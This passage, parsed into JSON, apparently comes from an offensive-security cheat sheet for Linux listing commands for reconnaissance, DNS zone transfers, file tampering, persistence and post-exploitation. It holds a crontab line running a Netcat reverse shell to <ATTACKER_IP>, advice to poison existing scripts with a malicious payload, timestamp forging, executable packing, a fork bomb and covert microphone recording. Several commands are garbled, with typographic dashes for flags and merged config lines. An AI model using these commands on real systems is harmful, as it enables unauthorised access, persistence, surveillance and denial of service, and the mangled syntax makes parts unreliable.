      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ip link set dev <INTERFACE_NAME> up",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Change MAC address",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iwlist <INTERFACE_NAME> scan",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Built-in Wi-Fi Scanner",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "cat /var/log/messages | grep DHCP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List DHCP assignments",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcpkill host <IP_ADDRESS> and port <PORT>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Kills TCP connections running over specific port number",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "echo “1” > /proc/sys/net/ipv4/ip_forward",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Enable on IP Forwarding",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "echo “nameserver <IP_ADDRESS>” >> /etc/resolv.conf",
      "level": 0,
      "metadata": {
        "file_paths": [
          "/etc/resolv.conf"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Add DNS server",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DNS Zone Transfer",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dig –x <IP_ADDRESS>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Reverse domain lookup",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "host <IP_ADDRESS_OR_HOSTNAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Domain lookup",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dig axfr <DOMAIN_NAME_TO_TRANSFER> @<DNS_IP>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DNS zone transfer",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "host -t axfr -l <DOMAIN_NAME_TO_TRANSFER> <DNS_IP>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DNS zone transfer",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Linux File Manipulation",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "File Manipulation",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "diff <FILE_PATH_A> <FILE_PATH_B>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Compare files",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "rm –rf <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Force recursive deletion of directory",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "shred –f –u <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Secure file deletion",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "touch –r <ORIGINAL_FILE_PATH> <MOD_FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Modify timestamp to match another file",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "touch –t <YYYYMMDDHHMM> <FILE>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Modify file timestamp",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "grep –c “<STRING>” <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Count lines containing specific string",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "awk 'sub(\"$\", \"\\r\")' <SOURCE_FILE_PATH> > <OUTPUT_FILE_PATH>",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Convert Linux formatted file to Windows compatible text file",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dos2unix <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Convert Windows formatted file to Linux compatible text file",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "find . –type f -name “*.<FILE_EXTENSION>”",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Search current and all subdirectories for all files that end with a specific extension",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "grep -Ria “<SEARCH_PHRASE>”",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Search all files (binary and regular files) in current and all subdirectories for a case insensitive phrase",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "wc -l <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Return the line count of a target file",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "find / -perm -4000 -exec ls -ld {} \\;",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Search for setuid files",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "file <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Determine file type",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "chattr +i <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "chattr –i <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Set/Unset immutable file",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dd if=/dev/urandom of=<OUTPUT_FILE_PATH> bs=3145728 count=100",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Generate random file (example 3M file)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "File Compression & Chunking",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Compress: tar -cf <OUTPUT_FILE>.tar <INPUT_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Extract: tar -xf <FILE_PATH>.tar",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Pack/unpack (archive) files using tar",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Compress: tar -czf <OUTPUT_FILE>.tar.gz <INPUT_PATH>",
      "level": 0,
      "metadata": {
        "file_paths": [
          ".tar.gz"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Extract: tar -xzf <FILE_PATH>.tar.gz",
      "level": 0,
      "metadata": {
        "file_paths": [
          ".tar.gz"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Compress and extract a .gz file using tar",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Compress: tar -cjf <OUTPUT_FILE>.tar.bz2 <INPUT_PATH>",
      "level": 0,
      "metadata": {
        "file_paths": [
          ".tar.bz2"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Extract: tar -xjf <FILE_PATH>.tar.bz2",
      "level": 0,
      "metadata": {
        "file_paths": [
          ".tar.bz2"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Compress and extract a .bz2 file using tar",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Compress: gzip <INPUT_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Extract: gzip –d <FILE_PATH>.gz",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Compress and extract using gzip",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Compress: zip –r <OUTPUT_FILE>.zip <INPUT_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Extract: unzip <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Compress and extract using zip",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "upx -9 –o <OUTPUT_FILE> <INPUT_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Pack an executable using UPX",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dd if=<INPUT_PATH> bs=4M | gzip -c | split -b 3K – “<OUTPUT_FILE>.chunk”",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Split file into 3k chunks using dd",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "cat <FILE_PATH>.chunk* | gzip -dc | dd of=<OUTPUT_PATH> bs=4M",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Restore chunked file using dd",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "File Hashing",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "md5sum <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Generate MD5 hash of a file",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "echo “<STRING>” | md5sum",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Generate MD5 hash of a string",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sha1sum <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Generate SHA1 hash of a file",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Linux Persistence",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "rc.local",
      "level": 0,
      "metadata": {
        "file_paths": [
          "rc.local"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "nano /etc/rc.local",
      "level": 0,
      "metadata": {
        "file_paths": [
          "/etc/rc.local"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "or",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "echo “<FILE_PATH>” >> /etc/rc.local",
      "level": 0,
      "metadata": {
        "file_paths": [
          "/etc/rc.local"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Add full path to rc.local file. This full path will be executed on system startup.",
      "level": 0,
      "metadata": {
        "file_paths": [
          "rc.local"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Linux Service",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "nano /etc/systemd/system/<SERVICE_NAME>.service",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Create/Open new service file using nano",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "[Unit]",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "after=network.targetDescription=My Service description",
      "level": 0,
      "metadata": {
        "file_paths": [
          "network.target"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "[Service]",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Type=simple",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Restart=always",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ExecStart=<FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "[Install]",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "WantedBy=multi-user.target",
      "level": 0,
      "metadata": {
        "file_paths": [
          "multi-user.target"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Add service information to file. <FILE_PATH> is full path to .sh file to execute on startup",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "When done, press CTRL+X, then press ‘Y’, then press ‘Enter’ to save and close the file with nano",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "systemctl daemon-reload",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Reload service manager",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "systemctl enable <SERVICE_NAME>.service",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Enable the service",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "systemctl start <SERVICE_NAME>.service",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Start the service persistence",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Crontab",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#Open new crontab:",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "crontab -e",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#Add the following line at the end:",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "0 * * * nc <ATTACKER_IP> <ATTACKER_PORT> -e /bin/sh",
      "level": 1,
      "metadata": {
        "number": "0"
      }
    },
    {
      "type": "paragraph",
      "content": "Create cron that runs a Netcat reverse shell every day at midnight",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#Open new crontab:",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "crontab -e",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#Add the following line at the end:",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "crontab -e 0 0 * * * <FULLPATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Create cron that runs a payload every day at midnight",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "More info at: https://crontab.guru/",
      "level": 0,
      "metadata": {
        "urls": [
          "https://crontab.guru/"
        ],
        "file_paths": [
          "//crontab.guru"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Poisoning Existing Scripts",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Enumerate all persistence methods discussed in this section looking for existing persistence that has been created via script files such as .sh, .py, etc. If those are modifiable, modify them to launch a malicious uploaded payload.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Linux Scripting",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "NIX SCRIPTING",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "for x in {1..254..1};do ping -c 1 1.1.1.$x |grep \"64 b\" |cut -d\" \" -f4 >> ips.txt; done",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ping sweep",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Replace first three octets of IP to set class C address to scan)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#!/bin/bash",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "echo \"Enter Class C Range: i.e. 192.168.3\"",
      "level": 0,
      "metadata": {
        "file_paths": [
          "i.e",
          "192.168.3"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "read range",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "for ip in {1..254..1};do",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "host $range.$ip |grep \"name pointer\" |cut -d\" \" -f5",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "done",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Reverse DNS Lookup",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Create new bash script with the following contents)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": ":(){ :|: & };:",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Fork bomb",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Creates processes until system \"crashes\")",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "for ip in {1..254..1}; do dig –x 1.1.1.$ip | grep $ip >> dns.txt; done;",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DNS reverse lookup",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Replace first three octets of IP to set class C address to scan)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "*NIX SCRIPTING Cont.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#!/bin/sh",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "This script bans any IP in the /24 subnet for 192.168.1.0 starting at 2",
      "level": 1,
      "metadata": {}
    },
    {
      "type": "heading",
      "content": "It assumes 1 is the router and does not ban IPs .20, .21, .22",
      "level": 1,
      "metadata": {}
    },
    {
      "type": "paragraph",
      "content": "i=2",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "while [[ $i –le 253 ]]",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "do",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "if [[ $i –ne 20 && $i –ne 21 && $i –ne 22 ]]; then",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "echo \"BANNED: arp –s 192.168.1.$i\"",
      "level": 0,
      "metadata": {
        "file_paths": [
          "192.168.1"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "arp –s 192.168.1.$i 00:00:00:00:00:0a",
      "level": 0,
      "metadata": {
        "file_paths": [
          "192.168.1"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "else",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "echo \"IP NOT BANNED:192.168.1.$i*****\"",
      "level": 0,
      "metadata": {
        "file_paths": [
          "192.168.1"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "echo \"*******************************\"",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "fi",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "i=`expr $i +1`",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "done",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "IP banning script",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "for line in $(cat <FILE_PATH>); do grep –i $line <FILE_PATH>; done;",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Compare 2 files for similar lines",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Linux Post Exploitation",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Misc Commands",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "arecord -L",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List out audio devices",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "arecord -d 5 -D plughw <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Record microphone (one of the devices listed above) for 5 seconds to a file",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "gcc <FILE_PATH>.c –o <OUTPUT_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Compile C program",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "init 6",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "init 0",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Reboot/Shutdown",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "cat /etc/*syslog*.conf | grep –v “^#”",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display log files",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "cat <FILE_PATH> | grep -Eo \"(http|https)://[a-zA-Z0-9./?=_%:-]*\" | sort -u",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Strip URL links out of a file",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "wget http://<URL> -O <FILE_PATH> -o /dev/null",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Scrape URL and write to a file",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "rdesktop <IP_ADDRESS>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Start a remote desktop session with target IP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "script –a <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Log all shell activity. Session is written to file after session exit",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "history",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "!<LINE_NUMBER>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display user command history and then execute specific line in history",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "nohup <COMMAND> &",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Background command and print all output from command to a file named .nohup",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "mount.cifs //<IP_ADDRESS>/<SHARE_NAME> /mnt/share –o user=<USERNAME>,pass=<PASSWORD>,domain=<DOMAIN>,rw",
      "level": 0,
      "metadata": {
        "file_paths": [
          "mount.cifs"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Mount SMB share to /mnt/share folder",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "export PATH=\"<PATH_TO_ADD>:$PATH\"",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Add another variable to the PATH",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "smbclient -U <USERNAME> //<IP_ADDRESS>/<SHARE_NAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Connect to Windows SMB Share",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Mount USB Device",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sudo fdisk -l",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List out potential devices to mount. Make note of the device path",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "mkdir /media/myUSBDevice",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Create directory to mount to",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "mount <DEVICE_PATH> /media/myUSBDevice/",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Mount device to created directory",
      "level": 0,
      "metadata": {
